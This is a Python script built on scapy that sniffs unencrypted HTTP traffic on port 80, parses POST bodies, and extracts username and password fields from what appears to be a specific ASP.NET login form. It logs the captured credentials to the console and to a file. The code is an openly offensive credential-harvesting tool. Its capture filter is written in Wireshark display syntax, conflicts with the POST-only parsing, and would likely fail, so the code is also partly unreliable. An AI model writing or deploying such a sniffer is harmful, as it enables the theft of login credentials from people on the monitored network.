import time, os, urllib
from scapy.all import TCP, IP, sniff, Raw

REQ_URLS_FILE = open('post-urls.txt', 'a')
# colors
WHITE = '\033[0m'
GREEN = '\033[32m'

def log(title, message='', write=False):
    if write:
        REQ_URLS_FILE.write(''.join([title,message, '\n']))
        REQ_URLS_FILE.flush()
        os.fsync(REQ_URLS_FILE.fileno())
    print(''.join([GREEN, title, WHITE, message]))

class HttpRequestCapture(object):
    def __init__(self, port, filter):
        self.port = port
        self.filter = filter

        self.http_load = ''
        self.http_fragged = False
        self.http_pack = None

    def parser(self, pkt):
        if not (pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt.haslayer(IP)):
            return
        elif self.port not in [pkt[TCP].sport, pkt[TCP].dport]:
            return

        self.parse_http(pkt[Raw].load, pkt[IP].ack)

    def parse_http(self, load, ack):
        # try decode to utf-8
        try:
            load = load.decode('utf-8')
        except (AttributeError, UnicodeDecodeError):
            pass

        if ack == self.http_pack:
            self.http_load = self.http_load + load
            load = self.http_load
            self.http_fragged = True
        else:
            self.http_load = load
            self.http_pack = ack
            self.http_fragged = False

        try:
            if type(load) == str:
                headers = load.split('\r\n\r\n',1)[0]
            else:
                try:
                    headers = load.split(b'\r\n\r\n',1)[0].decode('utf-8')
                except:
                    print(load.split(b'\r\n\r\n',1)[0])
                    headers = load.split(b'\r\n\r\n',1)[0].decode('utf-8')
            header_lines = headers.split('\r\n')
        except ValueError:
            header_lines = load.split('\r\n')

        http_req_url = self.get_http_req_url(header_lines)

        if http_req_url:
            # print("POST_HEADERS: " + str(headers))
            load_list = str(load).split("\r\n\r\n")
            if len(load_list) > 1:
                data = load_list[1]
                # print("LOAD_DATA: " + data)
                data_dict = urllib.parse.parse_qs(data,keep_blank_values=True)
                if "ctl00$body$username" in data_dict:
                    log("Username: ", data_dict["ctl00$body$username"][0], True)
                if "ctl00$body$password" in data_dict:
                    log("Password: ", data_dict["ctl00$body$password"][0], True)


            log(time.strftime('%a, %d %b %Y %H:%M:%S %z: '), http_req_url, True)

    @staticmethod
    def get_http_req_url(header_lines):
        host = ''
        uri = ''
        http_method = header_lines[0][0:header_lines[0].find('/')].strip()

        if http_method != 'POST':
            return

        for line in header_lines:
            # find host
            if 'Host:' in line:
                host = line.split('Host: ')[1].strip()

            # find uri
            if 'POST /' in line:
                uri = line.split('POST ')[1].split(' HTTP/')[0].strip()

        return ''.join([host, uri])

    def start(self):
        sniff(
            prn=self.parser,
            filter=self.filter
        )

if __name__ == "__main__":
    try:
        log('HTTP POST REQUEST CAPTURE STARTED')
        httpRequestCapture = HttpRequestCapture(
            port=80,
            filter="tcp && http.request.method == 'GET'",
        )
        httpRequestCapture.start()
    except KeyboardInterrupt:
        exit()